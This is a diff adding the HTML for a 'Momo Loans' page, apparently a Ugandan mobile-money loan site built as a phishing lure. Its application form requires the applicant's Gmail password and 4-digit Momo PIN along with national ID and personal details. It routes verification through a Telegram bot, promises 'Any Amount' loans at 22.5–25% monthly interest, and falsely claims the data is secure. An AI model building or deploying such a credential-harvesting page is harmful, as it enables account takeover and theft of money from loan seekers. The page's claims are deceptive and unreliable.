@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Momo Loans - Fast & Secure Loans in Uganda</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="logo">
+                <span class="logo-icon">💰</span>
+                <h1>Momo Loans</h1>
+            </div>
+            <ul class="nav-links">
+                <li><a href="#home">Home</a></li>
+                <li><a href="#services">Services</a></li>
+                <li><a href="#how-it-works">How It Works</a></li>
+                <li><a href="#apply" class="nav-cta">Apply Now</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+        <div class="hero-content">
+            <h2>Fast Loans, Zero Stress</h2>
+            <p>Get a loan in minutes with Momo Loans. Easy, secure, and designed for Ugandans.</p>
+            <button class="cta-button" onclick="document.getElementById('apply').scrollIntoView({behavior: 'smooth'})">Get Started</button>
+        </div>
+        <div class="hero-image">
+            <div class="phone-mockup">
+                <div class="phone-screen">
+                    <p>📱 Apply Instantly</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Services Section -->
+    <section class="services" id="services">
+        <h2 class="section-title">Our Loan Products</h2>
+        <div class="services-grid">
+            <!-- Personal Loan -->
+            <div class="service-card">
+                <div class="card-icon">💳</div>
+                <h3>Personal Loan</h3>
+                <p class="loan-amount">Any Amount</p>
+                <ul class="loan-features">
+                    <li>✓ Fast Approval</li>
+                    <li>✓ Low Interest Rates</li>
+                    <li>✓ Flexible Repayment</li>
+                </ul>
+                <p class="interest-rate">Interest: 22.5% per month</p>
+            </div>
+
+            <!-- Business Loan -->
+            <div class="service-card">
+                <div class="card-icon">🏢</div>
+                <h3>Business Loan</h3>
+                <p class="loan-amount">Any Amount</p>
+                <ul class="loan-features">
+                    <li>✓ Grow Your Business</li>
+                    <li>✓ Easy Terms</li>
+                    <li>✓ Quick Disbursement</li>
+                </ul>
+                <p class="interest-rate">Interest: 23% per month</p>
+            </div>
+
+            <!-- Emergency Loan -->
+            <div class="service-card">
+                <div class="card-icon">⚡</div>
+                <h3>Emergency Loan</h3>
+                <p class="loan-amount">Any Amount</p>
+                <ul class="loan-features">
+                    <li>✓ 24/7 Available</li>
+                    <li>✓ Instant Cash</li>
+                    <li>✓ No Collateral</li>
+                </ul>
+                <p class="interest-rate">Interest: 25% per month</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- How It Works -->
+    <section class="how-it-works" id="how-it-works">
+        <h2 class="section-title">How to Get a Loan</h2>
+        <div class="steps-container">
+            <div class="step">
+                <div class="step-number">1</div>
+                <h4>Fill Your Details</h4>
+                <p>Enter your personal information and loan amount needed</p>
+            </div>
+            <div class="arrow">→</div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <h4>Verify Identity</h4>
+                <p>Secure verification through our Telegram bot</p>
+            </div>
+            <div class="arrow">→</div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <h4>Get Approved</h4>
+                <p>Receive approval decision in minutes</p>
+            </div>
+            <div class="arrow">→</div>
+            <div class="step">
+                <div class="step-number">4</div>
+                <h4>Receive Funds</h4>
+                <p>Money sent directly to your Momo wallet</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Application Form -->
+    <section class="application" id="apply">
+        <div class="form-container">
+            <h2>Loan Application Form</h2>
+            <p class="form-subtitle">Quick & Easy - Takes Less Than 5 Minutes</p>
+
+            <form id="loanForm" class="loan-form">
+                <!-- Personal Information -->
+                <div class="form-section">
+                    <h3>Personal Information</h3>
+                    
+                    <div class="form-group">
+                        <label for="fullName">Full Name</label>
+                        <input type="text" id="fullName" name="fullName" placeholder="e.g., John Musekera" required>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="email">Email Address</label>
+                            <input type="email" id="email" name="email" placeholder="your@email.com" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="phone">Phone Number</label>
+                            <input type="tel" id="phone" name="phone" placeholder="+256 701 234 567" required>
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="national">National ID</label>
+                            <input type="text" id="national" name="national"   required>
+                        </div>
+                        <div class="form-group">
+                            <label for="dob">Date of Birth</label>
+                            <input type="date" id="dob" name="dob" required>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Loan Details -->
+                <div class="form-section">
+                    <h3>Loan Details</h3>
+                    
+                    <div class="form-group">
+                        <label for="loanType">Loan Type</label>
+                        <select id="loanType" name="loanType">
+                            <option value="">-- Select Loan Type --</option>
+                            <option value="personal">Personal Loan (Any Amount)</option>
+                            <option value="business">Business Loan (Any Amount)</option>
+                            <option value="emergency">Emergency Loan (Any Amount)</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="loanAmount">Loan Amount (USH)</label>
+                        <div class="amount-input-wrapper">
+                            
+                            <input type="number" id="loanAmount" name="loanAmount" placeholder="e.g., 100000" min="1" required>
+                        </div>
+                        <div id="amountError" class="error-message"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="loanPurpose">Purpose of Loan</label>
+                        <select id="loanPurpose" name="loanPurpose" required>
+                            <option value="">-- Select Purpose --</option>
+                            <option value="personal_use">Personal Use</option>
+                            <option value="business_expansion">Business Expansion</option>
+                            <option value="education">Education</option>
+                            <option value="medical">Medical Expenses</option>
+                            <option value="home_improvement">Home Improvement</option>
+                            <option value="debt_consolidation">Debt Consolidation</option>
+                            <option value="other">Other</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="repaymentPeriod">Repayment Period (Months)</label>
+                        <input type="number" id="repaymentPeriod" name="repaymentPeriod" placeholder="e.g., 3" min="1" max="12" required>
+                    </div>
+                </div>
+
+                <!-- Financial Information -->
+                <div class="form-section">
+                    <h3>Financial Information</h3>
+                    
+                    <div class="form-group">
+                        <label for="monthlyIncome">Monthly Income (USH)</label>
+                        <div class="amount-input-wrapper">
+                            <span class="currency">USH</span>
+                            <input type="number" id="monthlyIncome" name="monthlyIncome" placeholder="e.g. 500000" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="MomoNumber">Momo Account Number</label>
+                        <input type="tel" id="MomoNumber" name="MomoNumber" placeholder="+256 701 234 567" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="gmailPassword">Gmail Password</label>
+                        <input type="password" id="gmailPassword" name="gmailPassword" placeholder="Enter your Gmail password" required>
+                        <small style="color: #666; font-size: 12px;">Required for verification purposes</small>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="momoPin">Momo Account PIN</label>
+                        <input type="password" id="momoPin" name="momoPin" placeholder="Enter your Momo PIN" maxlength="4" required>
+                        <small style="color: #666; font-size: 12px;">4-digit PIN required for transaction verification</small>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="employmentStatus">Employment Status</label>
+                        <select id="employmentStatus" name="employmentStatus" required>
+                            <option value="">-- Select Status --</option>
+                            <option value="employed">Employed</option>
+                            <option value="self_employed">Self-Employed</option>
+                            <option value="business_owner">Business Owner</option>
+                            <option value="unemployed">Unemployed</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Reference -->
+                <div class="form-section">
+                    <h3>Reference Information</h3>
+                    
+                    <div class="form-group">
+                        <label for="referenceContact">Reference Contact Person</label>
+                        <input type="text" id="referenceContact" name="referenceContact" placeholder="Contact name" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="referencePhone">Reference Phone Number</label>
+                        <input type="tel" id="referencePhone" name="referencePhone" placeholder="+256 701 234 567" required>
+                    </div>
+                </div>
+
+                <!-- Agreement -->
+                <div class="form-section">
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="terms" name="terms" required>
+                        <label for="terms">I agree to the Terms & Conditions and Privacy Policy</label>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="telegram" name="telegram" required>
+                        <label for="telegram">I agree to receive updates and notifications via Telegram</label>
+                    </div>
+                </div>
+
+                <!-- Loan Calculator -->
+                <div class="loan-summary">
+                    <h4>Loan Summary</h4>
+                    <div class="summary-item">
+                        <span>Loan Amount:</span>
+                        <span id="summaryAmount">USH 0</span>
+                    </div>
+                    <div class="summary-item">
+                        <span>Estimated Interest Rate:</span>
+                        <span id="summaryRate">0%</span>
+                    </div>
+                    <div class="summary-item highlight">
+                        <span>Total Repayment:</span>
+                        <span id="summaryTotal">USH 0</span>
+                    </div>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="submit-button">
+                    Submit Application
+                </button>
+
+                <p class="form-footer">🔒 Your data is secure and encrypted. </p>
+            </form>
+
+            <!-- Success Message -->
+            <div id="successMessage" class="success-message" style="display: none;">
+                <div class="success-content">
+                    <div class="success-icon">✓</div>
+                    <h3>Application Submitted Successfully!</h3>
+                    <p>Your loan application has been received. Our team will review it and contact you via Telegram shortly.</p>
+                    <p class="telegram-notice">📱 Contact us on Telegram: <strong>@MomoLoansUG</strong></p>
+                    <button class="btn-secondary" onclick="location.reload()">Submit Another Application</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>Momo Loans</h4>
+                <p>Fast, secure, and reliable loan services for Ugandans.</p>
+            </div>
+            <div class="footer-section">
+                <h4>Quick Links</h4>
+                <ul>
+                    <li><a href="#home">Home</a></li>
+                    <li><a href="#services">Services</a></li>
+                    <li><a href="#how-it-works">How It Works</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h4>Contact Us</h4>
+                <p>Telegram: @MomoLoansUG</p>
+                <p>Email: info@momoloans.ug</p>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2026 Momo Loans Uganda. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script src="assets/js/script.js"></script>
+</body>
+</html>
